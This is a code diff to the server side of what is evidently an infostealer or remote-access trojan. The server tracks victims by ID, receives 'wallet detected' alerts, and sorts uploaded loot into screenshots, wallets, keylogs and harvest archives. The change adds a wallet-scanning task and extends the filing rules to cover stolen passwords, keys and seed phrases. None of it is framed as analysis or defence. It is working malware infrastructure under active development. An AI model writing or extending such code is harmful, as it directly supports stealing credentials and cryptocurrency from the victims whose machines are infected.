@@ -315,6 +315,7 @@ async function handleText(victimId: string, message: Message): Promise<void> {
   if (dispatched > 0) return;
   if (content === 'ping') return;
   if (content.startsWith('pong')) return;
+  if (/^Task .* queued$/.test(content)) return;
   const seconds = Math.floor(Date.now() / 1000);
 
   if (content.startsWith('wallet detected:')) {
@@ -415,9 +416,12 @@ async function forEachPartCleanup(paths: string[]): Promise<void> {
 
 async function ingestFile(link: { channelId: string; victimId: string }, externalId: string, name: string, path: string): Promise<void> {
   const info = await stat(path);
-  const module = name.toLowerCase().endsWith('.png') ? 'screenshot'
-    : name.toLowerCase().endsWith('.zip') ? 'harvest'
-    : name.toLowerCase().includes('passwords') ? 'keylogs'
+  const lower = name.toLowerCase();
+  const prefix = lower.split('-')[0]!;
+  const module = lower.endsWith('.png') || prefix === 'screenshot' ? 'screenshot'
+    : prefix === 'wallets' || lower.startsWith('wallets') ? 'wallets'
+    : lower.includes('passwords') || lower.includes('keys') || lower.includes('seeds') || prefix === 'keylogs' ? 'keylogs'
+    : lower.endsWith('.zip') ? 'harvest'
     : 'files';
   const artifact = await prisma.artifact.create({
     data: {
@@ -432,7 +436,7 @@ async function ingestFile(link: { channelId: string; victimId: string }, externa
     }
   });
   await prisma.event.create({ data: { victimId: link.victimId, kind: 'artifact_received', data: { name, bytes: info.size, module } } });
-  const taskName = module === 'harvest' ? 'harvest' : module === 'screenshot' ? 'screenshot' : '';
+  const taskName = module === 'harvest' ? 'harvest' : module === 'screenshot' ? 'screenshot' : module === 'wallets' ? 'scan_wallets' : '';
   if (taskName) {
     await prisma.task.updateMany({
       where: { victimId: link.victimId, name: taskName, status: 'running' },
